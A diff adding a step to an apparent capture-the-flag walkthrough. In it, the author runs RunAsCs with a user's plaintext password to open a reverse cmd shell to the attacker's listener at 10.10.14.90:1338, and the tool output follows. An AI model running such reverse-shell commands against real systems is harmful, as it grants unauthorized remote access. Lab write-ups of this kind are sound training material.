@@ -615,6 +615,18 @@ Mode                LastWriteTime         Length Name
 ```
 Ive uploaded RunAsCs.exe to the target via a python webserver
 
+Ill set another listener
+
+```python
+SHELL> ./rac.exe c.bum 'Tikkycoll_431012284' -r 10.10.14.90:1338 cmd
+[*] Warning: The logon for user 'c.bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-753dd$\Default
+[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1392 created in background.
+```
+This sent the connection
+
 ```python
 
 ```
